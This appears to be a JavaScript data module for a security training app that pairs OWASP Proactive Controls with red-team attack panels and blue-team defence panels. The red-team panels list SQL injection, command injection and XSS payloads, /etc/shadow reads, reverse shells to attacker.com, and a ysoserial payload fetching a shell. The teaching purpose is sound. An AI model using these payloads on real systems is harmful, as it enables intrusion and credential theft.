import { proactiveControlsData } from './proactiveControlsData';

export const proactiveControls = {
  sqlInjection: {
    title: 'C5: Validate All Inputs',
    content: proactiveControlsData.C5_VALIDATE_INPUTS,
    redTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Discovery & Exploitation Tools</h4>
          <ul class="space-y-3">
            <li>
              <strong class="text-red-400">SQLMap</strong>: Automated SQL injection detection
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>sqlmap -u "http://target.com/page?id=1" --dbs --batch</code></pre>
            </li>
            <li>
              <strong class="text-red-400">Burp Suite</strong>: Intercept and modify requests
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>// Common payloads
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
' WAITFOR DELAY '0:0:5'--</code></pre>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Common Entry Points</h4>
          <ul class="list-disc list-inside space-y-2">
            <li>URL parameters (?id=1)</li>
            <li>POST form data</li>
            <li>HTTP headers</li>
            <li>JSON/XML APIs</li>
          </ul>
        </div>
      </div>
    `,
    blueTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Prevention & Detection</h4>
          <ul class="space-y-3">
            <li>
              <strong class="text-blue-400">Parameterized Queries</strong>
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>// Instead of
query("SELECT * FROM users WHERE id = " + userId);

// Do this
query("SELECT * FROM users WHERE id = ?", [userId]);</code></pre>
            </li>
            <li>
              <strong class="text-blue-400">WAF Rules</strong>
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>SecRule ARGS "@detectSQLi" \\
  "id:942100,phase:2,block,msg:'SQL Injection'"</code></pre>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Monitoring & Response</h4>
          <ul class="list-disc list-inside space-y-2">
            <li>Monitor failed SQL queries</li>
            <li>Set up alerts for unusual patterns</li>
            <li>Regular security audits</li>
            <li>Incident response plan</li>
          </ul>
        </div>
      </div>
    `
  },

  commandExecution: {
    title: 'C5: Validate All Inputs',
    content: proactiveControlsData.C5_VALIDATE_INPUTS,
    redTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Discovery & Exploitation Tools</h4>
          <ul>
            <li><strong class="text-red-400">Commix</strong>: Command injection exploitation
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>commix --url="http://target.com/vulnerable.php?cmd=id" --level=3</code></pre>
            </li>
            <li><strong class="text-red-400">Burp Suite</strong>: Test command injection payloads
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>; whoami
| cat /etc/passwd
\`id\`
$(cat /etc/shadow)</code></pre>
            </li>
            <li><strong class="text-red-400">Reverse Shell Commands</strong>:
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>bash -i >& /dev/tcp/attacker.com/4444 0>&1
python -c 'import socket,subprocess,os;...'
nc -e /bin/sh attacker.com 4444</code></pre>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Common Entry Points</h4>
          <ul class="list-disc list-inside space-y-2">
            <li>File upload processors</li>
            <li>System command wrappers</li>
            <li>Template engines</li>
            <li>Diagnostic tools</li>
          </ul>
        </div>
      </div>
    `,
    blueTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Prevention & Detection</h4>
          <ul>
            <li><strong class="text-blue-400">System Hardening</strong>:
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>Disable unnecessary commands</li>
                <li>Implement command whitelisting</li>
                <li>Use seccomp/AppArmor profiles</li>
              </ul>
            </li>
            <li><strong class="text-blue-400">Monitoring</strong>:
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>auditd -w /bin/bash -p x -k bash_execution
auditd -w /usr/bin/nc -p x -k netcat_execution</code></pre>
            </li>
            <li><strong class="text-blue-400">Network Controls</strong>:
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>Egress filtering</li>
                <li>Network segmentation</li>
                <li>Outbound connection monitoring</li>
              </ul>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Incident Response</h4>
          <ul class="list-disc list-inside space-y-2">
            <li>Isolate compromised systems</li>
            <li>Review command execution logs</li>
            <li>Check for persistence mechanisms</li>
            <li>Monitor for data exfiltration</li>
          </ul>
        </div>
      </div>
    `
  },

  xssVulnerability: {
    title: 'A03:2021 - Injection - Cross-site scripting enabling client-side attacks',
    content: proactiveControlsData.C4_ENCODE_ESCAPE,
    redTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Discovery & Exploitation Tools</h4>
          <ul class="space-y-3">
            <li>
              <strong class="text-red-400">XSStrike</strong>: Advanced XSS detection
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>xsstrike -u "http://target.com/page?param=test"</code></pre>
            </li>
            <li>
              <strong class="text-red-400">Burp Suite</strong>: Active scanning and manual testing
              <ul class="mt-2 list-disc list-inside space-y-1 text-gray-300">
                <li>Test different contexts (HTML, JS, attributes)</li>
                <li>Use XSS payload lists</li>
              </ul>
            </li>
            <li>
              <strong class="text-red-400">BeEF</strong>: Browser Exploitation Framework
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>beef-xss</code></pre>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Common Payloads</h4>
          <pre class="bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>&lt;img src=x onerror=alert(1)&gt;
javascript:alert(document.cookie)
&lt;svg onload=alert(1)&gt;
'-alert(1)-'</code></pre>
        </div>
      </div>
    `,
    blueTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Prevention & Detection</h4>
          <ul class="space-y-3">
            <li>
              <strong class="text-blue-400">Content Security Policy</strong>
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>Content-Security-Policy: default-src 'self'; script-src 'self'</code></pre>
            </li>
            <li>
              <strong class="text-blue-400">Input Validation</strong>
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>// Instead of
element.innerHTML = userInput;

// Do this
element.textContent = userInput;
// Or
const escaped = escapeHtml(userInput);</code></pre>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Security Headers</h4>
          <pre class="bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'</code></pre>
        </div>
      </div>
    `
  },

  sensitiveExposure: {
    title: 'C8: Protect Data Everywhere',
    content: proactiveControlsData.C8_PROTECT_DATA,
    redTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Discovery Tools</h4>
          <ul>
            <li><strong class="text-red-400">GitRob</strong>: Find sensitive data in repositories
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>gitrob analyze organization_name</code></pre>
            </li>
            <li><strong class="text-red-400">TruffleHog</strong>: Scan for secrets
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>trufflehog --regex --entropy=False https://github.com/target</code></pre>
            </li>
            <li><strong class="text-red-400">Nmap</strong>: Service discovery
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>nmap -sV -p- --script ssl-enum-ciphers target.com</code></pre>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Common Targets</h4>
          <ul class="list-disc list-inside space-y-2">
            <li>API keys and tokens</li>
            <li>Configuration files</li>
            <li>Backup files (.bak, .old)</li>
            <li>Debug endpoints</li>
          </ul>
        </div>
      </div>
    `,
    blueTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Prevention & Detection</h4>
          <ul>
            <li><strong class="text-blue-400">Secret Management</strong>:
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>Use vault systems</li>
                <li>Encrypt sensitive data</li>
                <li>Rotate credentials regularly</li>
              </ul>
            </li>
            <li><strong class="text-blue-400">Monitoring</strong>:
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>File integrity monitoring</li>
                <li>Access log analysis</li>
                <li>Data loss prevention (DLP)</li>
              </ul>
            </li>
            <li><strong class="text-blue-400">Git Hooks</strong>:
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>git secrets --install
git secrets --register-aws</code></pre>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Data Classification</h4>
          <ul class="list-disc list-inside space-y-2">
            <li>Identify sensitive data</li>
            <li>Apply appropriate controls</li>
            <li>Regular auditing</li>
          </ul>
        </div>
      </div>
    `
  },

  brokenAuth: {
    title: 'C6: Implement Digital Identity',
    content: proactiveControlsData.C6_DIGITAL_IDENTITY,
    redTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Discovery & Exploitation Tools</h4>
          <ul>
            <li><strong class="text-red-400">Hydra</strong>: Password brute forcing
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>hydra -l admin -P wordlist.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"</code></pre>
            </li>
            <li><strong class="text-red-400">Burp Suite Intruder</strong>: Authentication testing
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>Password spraying attacks</li>
                <li>Session token analysis</li>
                <li>2FA bypass attempts</li>
              </ul>
            </li>
            <li><strong class="text-red-400">JWT_Tool</strong>: JWT token testing
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>python3 jwt_tool.py [token] -T
python3 jwt_tool.py [token] -C -d wordlist.txt</code></pre>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Common Vulnerabilities</h4>
          <ul class="list-disc list-inside space-y-2">
            <li>Weak password policies</li>
            <li>Predictable session tokens</li>
            <li>Missing 2FA/MFA</li>
            <li>Password reset flaws</li>
          </ul>
        </div>
      </div>
    `,
    blueTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Prevention & Detection</h4>
          <ul>
            <li><strong class="text-blue-400">Authentication Hardening</strong>:
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>Implement strong password policies</li>
                <li>Enable MFA/2FA</li>
                <li>Use secure session management</li>
              </ul>
            </li>
            <li><strong class="text-blue-400">Monitoring</strong>:
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>fail2ban-client status http-auth
waf_rule 'block if IP.failed_logins > 5 in 5m'</code></pre>
            </li>
            <li><strong class="text-blue-400">Session Security</strong>:
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>Set-Cookie: session=123; HttpOnly; Secure; SameSite=Strict
Set-Cookie: session=123; Path=/; Domain=example.com</code></pre>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Incident Response</h4>
          <ul class="list-disc list-inside space-y-2">
            <li>Force password resets</li>
            <li>Invalidate active sessions</li>
            <li>Review authentication logs</li>
            <li>Enable additional monitoring</li>
          </ul>
        </div>
      </div>
    `
  },

  brokenAccessControl: {
    title: 'C7: Enforce Access Controls',
    content: proactiveControlsData.C7_ACCESS_CONTROLS,
    redTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Discovery & Exploitation Tools</h4>
          <ul>
            <li><strong class="text-red-400">Autorize</strong>: Burp extension for access control testing
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>Automated privilege escalation testing</li>
                <li>Role switching analysis</li>
              </ul>
            </li>
            <li><strong class="text-red-400">OWASP ZAP</strong>: Forced browsing
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>zap-cli quick-scan --spider -r target.com</code></pre>
            </li>
            <li><strong class="text-red-400">DirBuster</strong>: Directory enumeration
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>dirb http://target.com /wordlists/common.txt</code></pre>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Testing Methodology</h4>
          <ul class="list-disc list-inside space-y-2">
            <li>Horizontal privilege escalation</li>
            <li>Vertical privilege escalation</li>
            <li>IDOR (Insecure Direct Object References)</li>
            <li>Missing function level access control</li>
          </ul>
        </div>
      </div>
    `,
    blueTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Prevention & Detection</h4>
          <ul>
            <li><strong class="text-blue-400">Access Control Design</strong>:
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>Role-Based Access Control (RBAC)</li>
                <li>Attribute-Based Access Control (ABAC)</li>
                <li>Zero Trust Architecture</li>
              </ul>
            </li>
            <li><strong class="text-blue-400">Implementation</strong>:
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>// Example RBAC middleware
@PreAuthorize("hasRole('ADMIN')")
@RolesAllowed({"USER", "ADMIN"})</code></pre>
            </li>
            <li><strong class="text-blue-400">Monitoring</strong>:
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>Access control violations</li>
                <li>Unusual access patterns</li>
                <li>Privilege escalation attempts</li>
              </ul>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Security Headers</h4>
          <pre class="bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>Strict-Transport-Security: max-age=31536000
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: same-origin</code></pre>
        </div>
      </div>
    `
  },

  securityMisconfig: {
    title: 'C10: Handle All Errors and Exceptions',
    content: proactiveControlsData.C10_ERROR_HANDLING,
    redTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Discovery Tools</h4>
          <ul>
            <li><strong class="text-red-400">Nikto</strong>: Web server misconfiguration scanner
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>nikto -h target.com -C all</code></pre>
            </li>
            <li><strong class="text-red-400">Nmap</strong>: Service configuration scanning
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>nmap -sV --script vuln target.com</code></pre>
            </li>
            <li><strong class="text-red-400">Nuclei</strong>: Template-based scanning
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>nuclei -u target.com -t security-misconfiguration</code></pre>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Common Misconfigurations</h4>
          <ul class="list-disc list-inside space-y-2">
            <li>Default credentials</li>
            <li>Debug mode enabled</li>
            <li>Directory listing</li>
            <li>Unnecessary services</li>
          </ul>
        </div>
      </div>
    `,
    blueTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Prevention & Detection</h4>
          <ul>
            <li><strong class="text-blue-400">Security Baseline</strong>:
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>Secure configuration templates</li>
                <li>Regular security audits</li>
                <li>Change management process</li>
              </ul>
            </li>
            <li><strong class="text-blue-400">Monitoring</strong>:
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>auditd -w /etc/nginx/nginx.conf -p wa
fail2ban-client status nginx-badbots</code></pre>
            </li>
            <li><strong class="text-blue-400">Configuration Management</strong>:
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>Infrastructure as Code</li>
                <li>Configuration validation</li>
                <li>Automated compliance checks</li>
              </ul>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Security Headers</h4>
          <pre class="bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>Server: [REMOVED]
X-Content-Type-Options: nosniff
X-Frame-Options: DENY</code></pre>
        </div>
      </div>
    `
  },

  insecureDeserialization: {
    title: 'C5: Validate All Inputs',
    content: proactiveControlsData.C5_VALIDATE_INPUTS,
    redTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Discovery & Exploitation Tools</h4>
          <ul>
            <li><strong class="text-red-400">ysoserial</strong>: Java deserialization testing
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>java -jar ysoserial.jar CommonsCollections1 'wget http://attacker.com/shell.php'</code></pre>
            </li>
            <li><strong class="text-red-400">PHPGGC</strong>: PHP deserialization payloads
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>./phpggc Symfony/RCE4 system 'id' -b</code></pre>
            </li>
            <li><strong class="text-red-400">Burp Suite</strong>: Manipulate serialized data
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>Identify serialized data patterns</li>
                <li>Modify object properties</li>
                <li>Inject malicious objects</li>
              </ul>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-red-400 mb-3">Common Targets</h4>
          <ul class="list-disc list-inside space-y-2">
            <li>Cookie values</li>
            <li>Hidden form fields</li>
            <li>API parameters</li>
            <li>URL parameters</li>
          </ul>
        </div>
      </div>
    `,
    blueTeam: `
      <div class="space-y-4">
        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Prevention & Detection</h4>
          <ul>
            <li><strong class="text-blue-400">Secure Deserialization</strong>:
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>Use JSON/Protocol Buffers</li>
                <li>Implement whitelisting</li>
                <li>Digital signatures</li>
              </ul>
            </li>
            <li><strong class="text-blue-400">Monitoring</strong>:
              <pre class="mt-2 bg-gray-900/50 p-3 rounded-md overflow-x-auto"><code>// Example Java security policy
grant {
    permission java.io.SerializablePermission "enableSubstitution";
};</code></pre>
            </li>
            <li><strong class="text-blue-400">Runtime Protection</strong>:
              <ul class="list-disc list-inside ml-5 space-y-1">
                <li>SerialKiller library</li>
                <li>Look-ahead deserialization</li>
                <li>Object whitelist validation</li>
              </ul>
            </li>
          </ul>
        </div>

        <div class="bg-gray-800/50 rounded-lg p-4 border border-gray-700">
          <h4 class="text-lg font-semibold text-blue-400 mb-3">Incident Response</h4>
          <ul class="list-disc list-inside space-y-2">
            <li>Analyze serialized data patterns</li>
            <li>Review application logs</li>
            <li>Check for persistence mechanisms</li>
            <li>Monitor for unusual behavior</li>
          </ul>
        </div>
      </div>
    `
  }
};
